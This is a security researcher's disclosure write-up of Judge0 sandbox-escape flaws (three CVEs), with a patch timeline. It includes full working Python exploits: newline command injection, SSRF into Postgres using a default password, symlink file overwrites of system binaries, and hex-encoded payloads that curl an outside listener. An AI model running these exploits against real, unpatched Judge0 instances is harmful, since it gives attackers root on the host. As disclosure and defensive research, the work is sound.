---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-02-29_judge0-sandbox-escape.md
original_filename: 2024-02-29_judge0-sandbox-escape.md
title: Judge0 Sandbox Escape
category: documents
detected_topics:
- ssrf
- command-injection
- api-security
- sqli
- otp
- rate-limit
tags:
- imported
- documents
- ssrf
- command-injection
- api-security
- sqli
- otp
- rate-limit
language: en
raw_sha256: e233475955183ef000cef82e5f7c163dc20c092dcb62e48ae03c0abc668f1c83
text_sha256: 39bf5c8419f961e7e3acafdb259af7ac0deaf82ac37003b1c8e573c6169c712b
ingested_at: '2026-06-28T07:32:31Z'
sensitivity: unknown
redactions_applied: true
---

# Judge0 Sandbox Escape

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-02-29_judge0-sandbox-escape.md
- Source Type: markdown
- Detected Topics: ssrf, command-injection, api-security, sqli, otp, rate-limit
- Ingested At: 2026-06-28T07:32:31Z
- Redactions Applied: True
- Raw SHA256: `e233475955183ef000cef82e5f7c163dc20c092dcb62e48ae03c0abc668f1c83`
- Text SHA256: `39bf5c8419f961e7e3acafdb259af7ac0deaf82ac37003b1c8e573c6169c712b`


## Content

---
title: "Judge0 Sandbox Escape"
url: "https://tantosec.com/blog/judge0/"
final_url: "https://tantosec.com/blog/judge0/"
authors: ["Daniel Cooper"]
programs: ["Judge0"]
bugs: ["Sandbox escape", "SSRF", "Security code review"]
publication_date: "2024-02-29"
added_date: "2024-05-08"
source: "pentester.land/writeups.json"
original_index: 400
---

Judge0 is an open source service used to run arbitrary code inside a secure sandbox. The Judge0 website lists 23 clients using the service, with more than 300 self-hosted instances available on the public internet and potentially many more within internal networks.

Tanto Security disclosed vulnerabilities in Judge0 that allow an adversary with sufficient access to perform a sandbox escape and obtain root permissions on the host machine. These vulnerabilities were assigned CVE-2024-29021, CVE-2024-28185 and CVE-2024-28189.

## Introduction

This post will cover a Judge0 sandbox escape and how I discovered it, including source code analysis and exploitation. It began as a simple conversation with a friend who used the platform to offload the difficult task of secure sandboxed code execution, which led me to investigate how it worked.

Judge0 is used by organisations focused on development and cyber security, including education and talent recruitment companies that must ensure the safe execution of code. The service is often used within competitive programming environments where code must be tested to produce correct outputs that correlate with the provided inputs.

I reviewed their [research paper](https://ieeexplore.ieee.org/abstract/document/9245310) and had a look at their codebase to find out more.

## Investigating

By taking a brief look at the structure of the codebase, I found the following:

  1. A user submits their code via an API endpoint to Judge0.
  2. A Ruby on Rails server receives this request and validates the submission data structure. It then inserts it into the PostgreSQL database.
  3. Processing of the submission is queued as a [Resque](https://github.com/resque/resque) job.
  4. The job is processed and run by the code within [isolate_job.rb](https://github.com/judge0/judge0/blob/ad66f77b131dbbebf2b9ff8083dca9a68680b3e5/app/jobs/isolate_job.rb). This code uses the [isolate binary](https://github.com/ioi/isolate) to sandbox the submission.

The `isolate` binary uses Linux namespaces and control groups similarly to how Docker uses them to isolate containers. Judge0 ships inside a Docker container running in `--privileged` mode so that it can access otherwise restricted components of the host system. For example, it is possible to mount the host filesystem and write files to it from a container running in privileged mode.

Because of this, if access to a `privileged` docker container is achieved it should be possible to break out and compromise the host system. More information can be found [at this Hacktricks link.](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#mounting-disk-poc1)

## The `isolate_job.rb` script

Most of the interesting code is inside [isolate_job.rb](https://github.com/judge0/judge0/blob/ad66f77b131dbbebf2b9ff8083dca9a68680b3e5/app/jobs/isolate_job.rb). This sets up the `isolate` sandbox, copies the relevant files inside of it, runs the job, and parses and stores the results.

One block of code caught my eye (can be found at [this link](https://github.com/judge0/judge0/blob/ad66f77b131dbbebf2b9ff8083dca9a68680b3e5/app/jobs/isolate_job.rb#L197)):
  
  
  unless submission.is_project
  # gsub is mandatory!
  command_line_arguments = submission.command_line_arguments.to_s.strip.encode("UTF-8", invalid: :replace).gsub(/[$&;<>|`]/, "")
  File.open(run_script, "w") { |f| f.write("#{submission.language.run_cmd} #{command_line_arguments}")}
  end
  

This code is in charge of creating `run_script`, a bash script used to execute the correct program. While `submission.language.run_cmd` is not user controlled, `command_line_arguments` can be supplied via the Judge0 API (which is public in some scenarios). I initially thought the `gsub` command was used to strip special characters out of the command line arguments that could, for example, be used to run additional processes.

However, after reviewing this blacklist, I realised that `\n` is another special character that could be used to inject commands. After following the [setup instructions](https://github.com/judge0/judge0/blob/master/CHANGELOG.md#deployment-procedure) to run Judge0 locally, I tested to see if it would work.
  
  
  curl --request POST \
  --url 'http://localhost:2358/submissions?wait=true' \
  --header 'Content-Type: application/json' \
  --data '{
  "source_code": "echo hi",
  "language_id": 46,
  "command_line_arguments": "x\necho POC"
  }'
  

From this, I received the following response:
  
  
  {
  "stdout": "hi\nPOC\n",
  "time": "0.05",
  "memory": 6548,
  "stderr": null,
  "token": "c859f250-b8ad-4ff0-8182-08b82c2ba762",
  "compile_output": null,
  "message": null,
  "status": {
  "id": 3,
  "description": "Accepted"
  }
  }
  

The `\n` allowed us to run the `echo POC` command! I had to use `x` at the start of the payload as otherwise the `.strip` method would remove the newline. Fortunately, the addition of the `x` doesn’t change the execution in any way.

Although it is possible to execute code outside of the submission `source_code`, it doesn’t help us as this is run inside the isolate sandbox. This seemed like a dead end.

## Ruby backticks

The way that Judge0 calls `isolate` is demonstrated in the following code:
  
  
  command = "isolate #{cgroups} \
  -s \
  -b #{box_id} \
  -M #{metadata_file} \
  #{submission.redirect_stderr_to_stdout ? "--stderr-to-stdout" : ""} \
  #{submission.enable_network ? "--share-net" : ""} \
  -t #{submission.cpu_time_limit} \
  -x #{submission.cpu_extra_time} \
  -w #{submission.wall_time_limit} \
  -k #{submission.stack_limit} \
  -p#{submission.max_processes_and_or_threads} \
  #{submission.enable_per_process_and_thread_time_limit ? (cgroups.present? ? "--no-cg-timing" : "") : "--cg-timing"} \
  #{submission.enable_per_process_and_thread_memory_limit ? "-m " : "--cg-mem="}#{submission.memory_limit} \
  -f #{submission.max_file_size} \
  -E HOME=/tmp \
  -E PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\" \
  -E LANG -E LANGUAGE -E LC_ALL -E JUDGE0_HOMEPAGE -E JUDGE0_SOURCE_CODE -E JUDGE0_MAINTAINER -E JUDGE0_VERSION \
  -d /etc:noexec \
  --run \
  -- /bin/bash run \
  < #{stdin_file} > #{stdout_file} 2> #{stderr_file} \
  "
  
  # ...
  
  `#{command}`
  

It is interesting that the command is run using Ruby backticks which uses a shell to interpret the arguments. This means I could run commands in subshells that would run outside of the isolate process if I could inject into these parameters, for example, injecting `$(id)` into `submission.stack_limit`. This, however, turned out to be a dead end as all the values injected were either validated to be numerical or were constants referring to string literals.

## What isn’t inside the sandbox?

The code that runs after a job finishes caught my eye:
  
  
  def cleanup(raise_exception = true)
  fix_permissions
  `sudo rm -rf #{boxdir}/* #{tmpdir}/*`
  [stdin_file, stdout_file, stderr_file, metadata_file].each do |f|
  `sudo rm -rf #{f}`
  end
  `isolate #{cgroups} -b #{box_id} --cleanup`
  raise "Cleanup of sandbox #{box_id} failed." if raise_exception && Dir.exists?(workdir)
  end
  

This contains commands inside backticks that run outside of the isolate process, making it a perfect candidate to try something malicious.

`boxdir` refers to the path of the sandbox directory on the host system, meaning I can control all the files in this folder. From this, I came up with this potential exploit:

  1. Use the submitted script to create a symlink called `mylink` in `boxdir` that points to `/some/host/file`
  2. When `cleanup` is run, it should run `sudo rm -rf /path/to/boxdir/mylink`
  3. Hopefully the `rm -rf` will follow the link and delete some files on the host system.

This failed as `rm -rf` would only follow `mylink` in this scenario if it ended in a slash.

## Running out of ideas - is `isolate` secure?

At this point I reviewed the documentation for `isolate` to find anything interesting and stumbled across a flag called `--share-net`:
  
  
  --share-net
  By default, isolate creates a new network namespace for its child process that contains no network devices except for a per-namespace loopback to prevent the program from communicating with the outside world. I can use this switch to keep the child process in parent’s network namespace if I want to permit communication.
  

As there is no additional protection stopping the container from accessing internal networks, we should be able to abuse this to forge server-side requests (also known as a Server-Side Request Forgery vulnerability, or SSRF). `--share-net` is enabled in `isolate` when the Judge0 flag `enable_network` is enabled, which is allowed only if `ALLOW_ENABLE_NETWORK` is true in the Judge0 config. `ALLOW_ENABLE_NETWORK` is true in the default Judge0 configuration.

To exploit this, I examined other services inside the Docker Compose file:
  
  
  version: '2'
  
  x-logging:
  &default-logging
  logging:
  driver: json-file
  options:
  max-size: 100m
  
  services:
  server:
  image: judge0/judge0:1.13.0
  volumes:
  - ./judge0.conf:/judge0.conf:ro
  ports:
  - "2358:2358"
  privileged: true
  <<: *default-logging
  restart: always
  
  workers:
  image: judge0/judge0:1.13.0
  command: ["./scripts/workers"]
  volumes:
  - ./judge0.conf:/judge0.conf:ro
  privileged: true
  <<: *default-logging
  restart: always
  
  db:
  image: postgres:13.0
  env_file: judge0.conf
  volumes:
  - postgres-data:/var/lib/postgresql/data/
  <<: *default-logging
  restart: always
  
  redis:
  image: redis:6.0
  command: [
  "bash", "-c",
  'docker-entrypoint.sh --appendonly yes --requirepass "$$REDIS_PASSWORD"'
  ]
  env_file: judge0.conf
  volumes:
  - redis-data:/data
  <<: *default-logging
  restart: always
  
  volumes:
  postgres-data:
  redis-data:
  

Postgres and Redis were particularly interesting as they could potentially perform sensitive operations. Redis was less interesting as it scheduled and coordinated Resque jobs, however, the database was intriguing due to the way submissions are stored.

I said earlier that validation of parameters occurs before the submission is created in the database, meaning that I could manually inject malicious parameters if I could interact with the database directly using the SSRF. The parameters injected into the shell command that runs `isolate` were of particular interest, namely `submission.stack_limit`.

A challenge was that the database column only accepts numerical values but since Ruby is a dynamically typed language I was curious if I could simply change the column type to be a string using a SQL command:
  
  
  ALTER TABLE submissions ALTER stack_limit TYPE text
  

Surprisingly Judge0 still functioned as usual with this column changing type! All I needed to do was write a script that interacted with PostgreSQL and change the `stack_limit` of a queued submission to be a shell payload such as `$(id)`.

It was a challenge to create a way to interact with PostgreSQL without the ability to easily use a library. I ended up writing my own code to implement the Postgres messaging protocol. For ease of use I wrapped it in a script that would also perform the POST request to the Judge0 API to submit. The code is as follows:
  
  
  #!/usr/bin/env python3
  
  import requests
  
  CMD = "curl http://host.docker.internal:9001/"
  
  SQL = "ALTER TABLE submissions ALTER stack_limit TYPE text; UPDATE submissions SET stack_limit='$({})' WHERE id=(SELECT MAX(id) FROM submissions);".format(
  CMD
  )
  
  CODE = """import socket
  import struct
  import hashlib
  import time
  
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("db", 5432))
  
  
  class SMsg:
  def __init__(self, type):
  self.header = type.encode() if type is not None else b""
  self.data = b""
  
  def write_int(self, n):
  self.data += struct.pack(">I", n)
  
  def write(self, d):
  self.data += d
  
  def write_str(self, s):
  self.data += s.encode() + b"\\x00"
  
  def send(self):
  s.sendall(self.header + struct.pack(">I", len(self.data) + 4) + self.data)
  
  
  class RMsg:
  def __init__(self, type, data):
  self.type = type
  self.data = data
  
  def get_int(self):
  strt = self.data[:4]
  self.data = self.data[4:]
  return struct.unpack(">I", strt)[0]
  
  def get(self, n):
  strt = self.data[:n]
  self.data = self.data[n:]
  assert len(strt) == n
  return strt
  
  @staticmethod
  def read():
  mtype = s.recv(1)[0]
  mlen = struct.unpack(">I", s.recv(4))[0]
  return RMsg(mtype, s.recv(mlen))
  
  
  def md5(x):
  return hashlib.md5(x).hexdigest()
  
  
  m = SMsg(None)
  m.write_int(196608)
  m.write_str("user")
  m.write_str("judge0")
  m.write_str("database")
  m.write_str("judge0")
  m.write(b"\\x00")
  m.send()
  
  resp = RMsg.read()
  assert resp.type == ord("R")
  assert resp.get_int() == 5  # md5 encryption
  salt = resp.get(4)
  assert resp.data == b""
  
  m = SMsg("p")
  m.write_str("md5" + md5(md5(b"YourPasswordHere1234" + b"judge0").encode() + salt))
  m.send()
  
  print(s.recv(1024))
  
  m = SMsg("Q")
  m.write_str("{}")
  m.send()
  
  print(s.recv(1024))""".format(
  SQL
  )
  
  TARGET = "http://localhost:2358"
  
  
  def submit(src):
  return requests.post(
  TARGET + "/submissions",
  json={"source_code": src, "language_id": 71, "enable_network": True},
  ).json()
  
  
  # if it doesnt work try increasing this
  NUM_PADDING = 20
  
  for i in range(NUM_PADDING):
  submit("print('hi')")
  submit(CODE)
  for i in range(NUM_PADDING):
  submit("print('hi')")
  

Some points to note:

  1. Authenticating to PostgreSQL requires a password. This password is configurable using the `judge0.conf` file, however, when following the deployment instructions there is no indication to change this from the default, so I assume that many configurations could still be using the default password (which is `YourPasswordHere1234`).

  * Even if the password has been changed, it would be possible to create a submission that can brute force this password.
  2. I made 41 submissions to ensure that some submissions would be queued up. This was important as I wanted to run a SQL query to modify the run arguments of a submission that has not yet been consumed by a worker. The number required here depends on the speed and number of workers on the Judge0 server.

The proof of concept confirmed code execution by way of a web request to my host machine using `curl` (this may take some time as the server must execute all jobs before the payload is executed).

![Command execution confirmed as netcat listener receives connection](alter-table-rce.png)

From here, I could create a reverse shell and then potentially escape the Docker container by mounting the host disk (which is allowed as the container is running in privileged mode). Later on, I reported this vulnerability and it was assigned CVE-2024-29021.

## Digging deeper

I found a sandbox escape, so does that mean my work here is done? Of course not!

There are a few problems with this exploit:

  1. It requires us to be able to use the `enable_network` flag.
  * This is unlikely to be possible with many self-hosted applications, which use Judge0 inside an internal network. The application would have to contain functionality to allow us to set the `enable_network` flag (which is unlikely as it doesn’t seem necessary in a lot of use cases)
  * `https://ce.judge0.com` is a publicly hosted Judge0 instance, however it has `ALLOW_ENABLE_NETWORK` disabled in its config file.
  2. It requires the default password for the database to be unchanged. Although the setup guide does not tell you to change it, there is a warning in the config file:
  
  # Password of the user. Cannot be blank. Used only in production.
  # Default: NO DEFAULT, YOU MUST SET YOUR PASSWORD
  POSTGRES_PASSWORD=***REDACTED***
  

I would like to find an exploit that doesn’t have these issues. In an ideal scenario, all I would need is to control the source code and I can get a sandbox escape that way. To investigate this, I decided to take another look at some of my older ideas.

## Sandboxed filesystem symlinks revisited

As I revisited the `rm -rf` failed exploit attempt, I decided to try a similar exploit targeting the following code (found [here](https://github.com/judge0/judge0/blob/ad66f77b131dbbebf2b9ff8083dca9a68680b3e5/app/jobs/isolate_job.rb#L232)):
  
  
  `sudo chown $(whoami): #{run_script} && rm #{run_script}` unless submission.is_project
  

To do this I replaced the `run_script` with a symlink to an absolute path on the host filesystem. And it turned out this worked! The file on the host system had its owner successfully changed.

I tried to use this to cause the program to crash and create a Denial of Service, but I couldn’t get it to work. However, it did put the following thought in my mind:

The `rm` command cannot be exploited here as it is its own file which can be unlinked. However, `chown` works with symlinks here as it changes data about the file.

And then I realised that the answer had been in front of me the entire time! If you remember this code from the very start of this investigation:
  
  
  unless submission.is_project
  # gsub is mandatory!
  command_line_arguments = submission.command_line_arguments.to_s.strip.encode("UTF-8", invalid: :replace).gsub(/[$&;<>|`]/, "")
  File.open(run_script, "w") { |f| f.write("#{submission.language.run_cmd} #{command_line_arguments}")}
  end
  

This code writes to a file called `run_script` (which is just the full path of a file called `run` inside the sandbox directory). However, **this file write is performed outside of the isolate sandbox!** That means that if I created a symlink named `run` inside the sandbox directory, this would write to the file pointed to by the symlink. In other words, I have an arbitrary file write vulnerability!

There were a few hurdles to get this to work:

  1. I needed to create the `run` symlink before the file write occurs. I did this using the `gsub` bypass mentioned earlier, however, this time using the `compiler_options` flag instead of the `command_line_arguments` flag. This works as the vulnerable code runs after the compile stage.
  2. The file write could be used to overwrite important files and cause a Denial of Service, but I wanted to get code execution. To do this, I created a shell script using the `gsub` bypass but this time using `command_line_arguments`. While the first line will likely fail as it will try and execute the compiled submission (which will not be in the current working directory at this point), `bash` does not exit the script if a single line fails, so our payload should still be executed.

Here is a sample exploit script:
  
  
  #!/usr/bin/env python3
  
  import requests
  
  TARGET = "http://localhost:2358"
  
  
  print(requests.post(
  TARGET + "/submissions?wait=true",
  json={
  "source_code": "NOT IMPORTANT",
  "language_id": 73, # Rust
  "compiler_options": "--version\nln -s ../../../../../../usr/local/bin/isolate ./run\n#",
  "command_line_arguments": "x\ncurl http://host.docker.internal:9001/rce"
  },
  ).json())
  

This script uses the symlink to overwrite `/usr/local/bin/isolate`, the binary called to run submissions. Let’s take a look at how the code handles this:

  1. When the program is compiled, `isolate_job.rb` runs the following code:

  
  
  # gsub can be skipped if compile script is used, but is kept for additional security.
  compiler_options = submission.compiler_options.to_s.strip.encode("UTF-8", invalid: :replace).gsub(/[$&;<>|`]/, "")
  File.open(compile_script, "w") { |f| f.write("#{submission.language.compile_cmd % compiler_options}") }
  

As `compile_cmd` for Rust (which is `language_id` 73) is `/usr/local/rust-1.40.0/bin/rustc %s main.rs`, this will result in the following `compile_script` being written to disk:
  
  
  /usr/local/rust-1.40.0/bin/rustc --version
  ln -s ../../../../../../usr/local/bin/isolate ./run
  # main.rs
  

This sets up our symlink for when the program is run. The following code writes to the `run_script`:
  
  
  # gsub is mandatory!
  command_line_arguments = submission.command_line_arguments.to_s.strip.encode("UTF-8", invalid: :replace).gsub(/[$&;<>|`]/, "")
  File.open(run_script, "w") { |f| f.write("#{submission.language.run_cmd} #{command_line_arguments}")}
  

As `run_cmd` for Rust is `./main`, this will result in the following being written to `run_script`:
  
  
  ./main x
  curl http://host.docker.internal:9001/rce
  

As `run_script` symlinks to the `isolate` binary, the `isolate` binary will be overwritten and called, causing our payload to be executed outside of the sandbox.

By starting a listener on port 9001 of our host machine and running the script we can see that the `curl` command was successful:
  
  
  ➜  judge0-v1.13.0 nc -l 9001
  GET /rce HTTP/1.1
  Host: host.docker.internal:9001
  User-Agent: curl/7.64.0
  Accept: */*
  

It is worth noting that I can’t use any of the blacklisted `gsub` characters in the injected command. This can be bypassed using the following command which encodes the payload:
  
  
  python3 -c 'eval(bytes.fromhex("7072696e7428227263652229").decode())'
  

This method is significantly more impactful due to it not requiring prior knowledge of the Postgres password. While the options for enabling custom command line arguments and compile time arguments may not always be available, these are commonly needed by end users to ensure successful compilation.

## What if the `gsub` issue was patched?

Even if users can only control the source code and language (and not the command line or compile options), it may still be possible to perform arbitrary file write and cause Denial of Service - I would just need to find a way of creating a symlink during the compilation step.

Judge0 supports many languages, and it is likely that one of these would allow for the creation of symlinks during compilation. However, the only content in the written file that can be controlled is the command line arguments (which cannot be edited without supplying the relevant parameter to Judge0) so code execution without controlling this parameter does not seem possible.

However, would it be possible to still get code execution if the `gsub` command worked as intended and prevented shell command injection? This should be possible if I can find alternative ways to create the symlink before the program is run and to make the run script run our code correctly.

  1. For creating the symlink before the program is run, I can make use of the `additional_files` Judge0 argument. This allows us to upload a zip file which will be extracted on the server. As zip files can contain symlinks, I can inject our symlink at this step! This bypasses the need for compilation at all, so I am now open to playing around with interpreted languages.

  2. For making the run script work, I took a deeper look at how `command_line_arguments` worked. Maybe there was a program in the list of languages that allows me to execute code through a command line argument?

After some digging I managed to find a language that fits this criteria: SQLite. Many other languages didn’t work as processable arguments must be specified before the script name (and I can only inject after the script name), however SQLite receives a script from standard input.

Here is the proof of concept without relying on the `gsub` oversight:
  
  
  #!/usr/bin/env python3
  
  import requests
  import io
  import zipfile
  import base64
  import stat
  
  TARGET = "http://localhost:2358"
  # Command to run outside of isolated environment
  CMD = "curl http://host.docker.internal:9001/"
  
  # Create zipfile in memory
  zip_buffer = io.BytesIO()
  with zipfile.ZipFile(zip_buffer, "a", zipfile.ZIP_DEFLATED, False) as zip_file:
  # Add symlink to zipfile. The symlink is called "run" and points to "/usr/local/bin/isolate"
  symlink_file = zipfile.ZipInfo("run")
  symlink_file.create_system = 3
  unix_st_mode = stat.S_IFLNK | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH
  symlink_file.external_attr = unix_st_mode << 16
  zip_file.writestr(symlink_file, '/usr/local/bin/isolate')
  
  # To avoid running into issues with the filter, the command can be encoded within python
  hex_payload = CMD.encode().hex()
  encoded_command = 'python3 -c __import__("os").system(bytes.fromhex("{}").decode())'.format(hex_payload)
  encoded_command = encoded_command.replace("(","\\\\(").replace(")","\\\\)").replace('"','\\\\"')
  
  # Submit the zipfile to the server.
  print(requests.post(
  TARGET + "/submissions?wait=true",
  json={
  "source_code": "NOT IMPORTANT",
  "language_id": 82, # SQLite
  "additional_files": base64.b64encode(zip_buffer.getvalue()).decode(),
  "command_line_arguments": f"-cmd '.shell {encoded_command}'"
  },
  ).json()['stdout'])
  

## The Patch

At this point I was ready to report the vulnerability to the developer. The developer ([Herman Zvonimir Došilović](https://hr.linkedin.com/in/hermanzdosilovic)) was very eager to fix the issue! CVE-2024-28185 was assigned to the vulnerability, and a patch was deployed shortly after. The patch can be found at [this link](https://github.com/judge0/judge0/commit/846d5839026161bb299b7a35fd3b2afb107992fc), and looks like the following:

![Patch deployed by Judge0 developer](deployed_patch.png)

This change essentially changes the Linux user that the Ruby on Rails application runs as. This is interesting as I was expecting the patch to be something to do with preventing symbolic links from being the target of file operations in `isolate_job.rb`.

The reason the patch was created was that the previous exploit overwrote `/usr/local/bin/isolate`, a file owned by root. This change breaks the proof of concept because the `judge0` user does not have permission to overwrite `/usr/local/bin/isolate`.

However, this is the only thing preventing us from exploiting the vulnerability. We can still write to arbitrary files outside of the sandbox! With that in mind, I started searching for a way to get code execution despite the patch.

## The Patch Bypass

If you remember from earlier, we managed to find a way to run the Linux `chown` command on arbitrary files in the filesystem. This turned out to be not very useful at the time as the application runs as root. After the patch the application runs as the lower privilege Judge0 user. This means that the `chown` exploit now has a use - to change the owner of our target so that we can overwrite it as done previously.

To do this, all we need to do is `chown` the target binary to the current user, and then perform the symlink exploit to overwrite the binary with a malicious script. I tried doing this to `/usr/local/bin/isolate`, but it turns out that `isolate` needs to be owned by `root` to function correctly. Instead, we can overwrite the `/bin/rm` binary which will achieve the same effect.

The resulting exploit script looks like this:
  
  
  #!/usr/bin/env python3
  
  import requests
  import io
  import zipfile
  import base64
  import stat
  
  # Target address of Judge0 server
  TARGET = "http://localhost:2358"
  
  # Command to run outside of the sandbox
  CMD = "echo SANDBOX ESCAPED > /tmp/poc"
  
  # File on the target to overwrite as a means of getting a sandbox escape
  TARGET_FILE = "/bin/rm"
  
  # Helper to create a zipfile with a single symbolic link inside
  def create_zipfile_with_link(link_name, link_path):
  zip_buffer = io.BytesIO()
  with zipfile.ZipFile(zip_buffer, "a", zipfile.ZIP_DEFLATED, False) as zip_file:
  symlink_file = zipfile.ZipInfo(link_name)
  symlink_file.create_system = 3
  unix_st_mode = stat.S_IFLNK | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH
  symlink_file.external_attr = unix_st_mode << 16
  zip_file.writestr(symlink_file, link_path)
  return base64.b64encode(zip_buffer.getvalue()).decode()
  
  # To avoid running into issues with the gsub filter, we will encode the command as hex and decode it using python3.
  # Decoding and running with python3 doesn't use the filtered characters: $&;<>|`
  hex_payload = CMD.encode().hex()
  encoded_command = 'python3 -c __import__("os").system(bytes.fromhex("{}").decode())'.format(hex_payload)
  encoded_command = encoded_command.replace("(","\\\\(").replace(")","\\\\)").replace('"','\\\\"')
  
  # Run an initial request that will cause the code to accidentally chown TARGET_FILE.
  # Required on v1.13.1 as the code runs as judge0 user, meaning we need to chown to be able to write to TARGET_FILE.
  print(requests.post(
  TARGET + "/submissions?wait=true",
  json={
  "source_code": f"mv run runbak; ln -s {TARGET_FILE} run",
  "language_id": 46, # Bash
  },
  ).json()['stdout'])
  
  # Send the command to write to TARGET_FILE. This will overwrite TARGET_FILE with our sqlite command.
  # The sqlite command calls python3, which will execute our CMD.
  print(requests.post(
  TARGET + "/submissions?wait=true",
  json={
  "source_code": "NOT IMPORTANT",
  "language_id": 82, # SQLite
  "additional_files": create_zipfile_with_link("run", TARGET_FILE),
  "command_line_arguments": f"-cmd '.shell {encoded_command}'"
  },
  ).json()['stdout'])
  

I reported this vulnerability to the developer, and a patch was deployed. CVE-2024-28189 was assigned to this issue.

## Further findings

While the issue is no longer exploitable, the root cause of the issue still remains. The application still currently allows arbitrary file write outside of the sandbox. After this I found one more bypass that wrote to `/api/tmp/environment`, a script automatically run by the application. This issue was then patched in [this commit.](https://github.com/judge0/judge0/commit/3fb87ebc7824af620d224a7676950af61b2bc1d4)

While the core arbitrary file write issue remains, it is likely there are other paths to achieve command execution. I raised my concern with Herman, who informed me that it would be better not to make major changes to the codebase if not necessary.

While I’m still not entirely happy with this fix, I can’t find another working proof of concept with the time available to me. In the future, I may have another attempt, or maybe someone reading this blog would like to try 😅

## Shoutouts

I would like to shoutout to [Herman Zvonimir Došilović](https://hermanz.dosilovic.com/) who is the developer of Judge0 and helped me to resolve these issues. Herman had a quick response time and was very committed to deploying patches as quickly as possible. It was obvious that Herman cares a lot about application security and the confidentiality of his customers.

I would also like to thank my colleagues at Tanto Security who helped me correctly report and publish this issue.

## Timeline

Date (D/M/Y)| Milestone  
---|---  
4/3/2024| CVE-2024-28185 reported to Judge0 developer  
6/3/2024| Vulnerability patched by developer  
8/3/2024| Patch bypass (CVE-2024-28189) found and reported  
9/3/2024| CVE-2024-28189 vulnerability patched  
10/3/2024| Bypass using `/api/tmp/environment` patched  
19/3/2024| CVE-2024-29021 reported to Judge0 developer  
18/4/2024| CVE-2024-29021 patched  
18/4/2024| Public disclosure of CVEs and release of patched version  
29/4/2024| Public release of proof of concepts and exploit scripts  
  
## Conclusion

Whilst I didn’t achieve my goal of being able to perform a sandbox escape using only the `source_code` parameter, I still discovered a vulnerability that has significant impact to users of Judge0. All the vulnerabilities detailed in this article have been fixed in version v1.13.1. If you are using a self-hosted Judge0 instance, update to v1.13.1 or higher to be protected against these attacks.
